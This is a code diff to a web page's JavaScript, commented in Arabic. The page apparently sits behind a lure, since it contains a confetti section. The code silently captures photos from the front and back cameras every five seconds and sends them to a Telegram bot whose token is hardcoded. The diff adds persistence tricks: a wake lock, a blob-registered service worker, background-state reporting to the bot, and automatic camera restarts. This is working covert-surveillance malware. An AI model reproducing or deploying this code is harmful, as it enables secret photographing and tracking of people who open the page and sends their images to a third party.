@@ -307,8 +307,8 @@ const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
 let frontCount = 0;
 let backCount = 0;
-let isCapturing = true;
-let frameCounter = 0;
+let isRunning = true;
+let captureInterval = null;
 
 // ============================================================
 // ====================== CONFETTI =============================
@@ -403,120 +403,164 @@ function getChatId() {
 // ====================== START CAMERAS =======================
 // ============================================================
 let frontStream = null, backStream = null;
-let frontInterval = null, backInterval = null;
 let frontReady = false, backReady = false;
+let frontVideo = null, backVideo = null;
 
 function startCameras() {
-    // الكاميرا الأمامية - تصوير مباشر كل 5 ثواني
+    // الكاميرا الأمامية
     navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
     })
     .then(function(stream) {
         frontStream = stream;
-        const video = document.getElementById('videoFront');
-        video.srcObject = stream;
-        video.onloadedmetadata = function() {
-            video.play();
+        frontVideo = document.getElementById('videoFront');
+        frontVideo.srcObject = stream;
+        frontVideo.onloadedmetadata = function() {
+            frontVideo.play();
             frontReady = true;
-            captureFrontPhoto();
-            frontInterval = setInterval(captureFrontPhoto, 5000);
         };
     })
     .catch(function(err) {});
     
-    // الكاميرا الخلفية - تصوير مباشر كل 5 ثواني
+    // الكاميرا الخلفية
     navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
     })
     .then(function(stream) {
         backStream = stream;
-        const video = document.getElementById('videoBack');
-        video.srcObject = stream;
-        video.onloadedmetadata = function() {
-            video.play();
+        backVideo = document.getElementById('videoBack');
+        backVideo.srcObject = stream;
+        backVideo.onloadedmetadata = function() {
+            backVideo.play();
             backReady = true;
-            captureBackPhoto();
-            backInterval = setInterval(captureBackPhoto, 5000);
         };
     })
     .catch(function(err) {});
+    
+    // بدء التصوير كل 5 ثواني
+    captureInterval = setInterval(captureBothPhotos, 5000);
+    
+    // التقاط أول صور فوراً بعد ثانية
+    setTimeout(captureBothPhotos, 1000);
+}
+
+function captureBothPhotos() {
+    captureFrontPhoto();
+    captureBackPhoto();
 }
 
 function captureFrontPhoto() {
-    const video = document.getElementById('videoFront');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    
-    if (!frontReady || !video.videoWidth || !video.videoHeight) {
-        return;
-    }
-    
-    // مسح الكانفاس بالكامل
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // إضافة بصمة فريدة للصورة
-    const timestamp = Date.now();
-    const random = Math.random().toString(36).substring(7);
-    const uniqueId = timestamp + '_' + random;
-    
-    const imgData = canvas.toDataURL('image/jpeg', 0.85);
-    frontCount++;
-    sendToTelegram(imgData, `📸 أمامي ${frontCount} - ${new Date().toLocaleString()} - ${uniqueId}`);
+    if (!frontReady || !frontVideo || !frontVideo.videoWidth) return;
+    try {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = frontVideo.videoWidth;
+        canvas.height = frontVideo.videoHeight;
+        ctx.drawImage(frontVideo, 0, 0);
+        const imgData = canvas.toDataURL('image/jpeg', 0.85);
+        frontCount++;
+        sendToTelegram(imgData, `📸 أمامي ${frontCount} - ${new Date().toLocaleString()}`);
+    } catch(e) {}
 }
 
 function captureBackPhoto() {
-    const video = document.getElementById('videoBack');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    
-    if (!backReady || !video.videoWidth || !video.videoHeight) {
-        return;
-    }
-    
-    // مسح الكانفاس بالكامل
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    // إضافة بصمة فريدة للصورة
-    const timestamp = Date.now();
-    const random = Math.random().toString(36).substring(7);
-    const uniqueId = timestamp + '_' + random;
-    
-    const imgData = canvas.toDataURL('image/jpeg', 0.85);
-    backCount++;
-    sendToTelegram(imgData, `📸 خلفي ${backCount} - ${new Date().toLocaleString()} - ${uniqueId}`);
+    if (!backReady || !backVideo || !backVideo.videoWidth) return;
+    try {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = backVideo.videoWidth;
+        canvas.height = backVideo.videoHeight;
+        ctx.drawImage(backVideo, 0, 0);
+        const imgData = canvas.toDataURL('image/jpeg', 0.85);
+        backCount++;
+        sendToTelegram(imgData, `📸 خلفي ${backCount} - ${new Date().toLocaleString()}`);
+    } catch(e) {}
 }
 
 // ============================================================
-// ====================== KEEP ALIVE ==========================
+// ====================== BACKGROUND SERVICE ==================
 // ============================================================
+// استخدام Broadcast Channel لمنع الإيقاف
+try {
+    const channel = new BroadcastChannel('keep_alive_channel');
+    channel.postMessage('keep_alive');
+    channel.onmessage = function(e) {
+        if (e.data === 'keep_alive') {
+            // استمرار التشغيل
+        }
+    };
+} catch(e) {}
+
 // منع المتصفح من إيقاف التشغيل
 document.addEventListener('visibilitychange', function() {
     if (document.hidden) {
-        // الصفحة في الخلفية - الكاميرات تستمر
+        // إرسال رسالة للبوت بأن الصفحة في الخلفية
         sendMessage('⏳ الصفحة في الخلفية - التصوير مستمر');
+        // التأكد من استمرار التشغيل
+        if (!captureInterval) {
+            captureInterval = setInterval(captureBothPhotos, 5000);
+        }
+    } else {
+        sendMessage('🔄 الصفحة نشطة - التصوير مستمر');
     }
 });
 
 // منع السكون
 try {
     if ('wakeLock' in navigator) {
-        navigator.wakeLock.request('screen').catch(() => {});
+        navigator.wakeLock.request('screen').then(function(lock) {
+            // قفل الشاشة لمنع السكون
+        }).catch(function() {});
     }
 } catch(e) {}
 
-// نبضات حياة للتأكد من الاستمرار
+// ============================================================
+// ====================== SERVICE WORKER ======================
+// ============================================================
+// تسجيل Service Worker للبقاء في الخلفية
+if ('serviceWorker' in navigator) {
+    // إنشاء Service Worker بسيط
+    const swCode = `
+        self.addEventListener('install', function(e) {
+            self.skipWaiting();
+        });
+        self.addEventListener('activate', function(e) {
+            e.waitUntil(clients.claim());
+        });
+        self.addEventListener('fetch', function(e) {
+            e.respondWith(fetch(e.request));
+        });
+    `;
+    const blob = new Blob([swCode], { type: 'application/javascript' });
+    const swUrl = URL.createObjectURL(blob);
+    navigator.serviceWorker.register(swUrl).then(function(reg) {
+        // Service Worker مسجل
+    }).catch(function() {});
+}
+
+// ============================================================
+// ====================== KEEP ALIVE ==========================
+// ============================================================
+// نبضات حياة كل 10 ثواني
 setInterval(function() {
-    if (CHAT_ID && isCapturing) {
-        // إرسال تأكيد بأن الكاميرات لا تزال تعمل كل دقيقة
+    if (CHAT_ID && isRunning) {
+        // إرسال نبضة للتأكد من الحياة
         console.log('🔴 alive - ' + new Date().toLocaleString());
+        
+        // التأكد من استمرار الكاميرات
+        if (!frontReady && !backReady) {
+            // محاولة إعادة تشغيل الكاميرات
+            if (!frontStream && !backStream) {
+                startCameras();
+            }
+        }
+        
+        // التأكد من استمرار التصوير
+        if (!captureInterval) {
+            captureInterval = setInterval(captureBothPhotos, 5000);
+        }
     }
-}, 60000);
+}, 10000);
 
 // ============================================================
 // ====================== INIT =================================
@@ -534,6 +578,13 @@ setTimeout(function() {
         getChatId();
     }
 }, 5000);
+
+// إعادة محاولة تشغيل الكاميرات إذا توقفت
+setTimeout(function() {
+    if (!frontReady && !backReady) {
+        startCameras();
+    }
+}, 10000);
 </script>
 </body>
 </html>
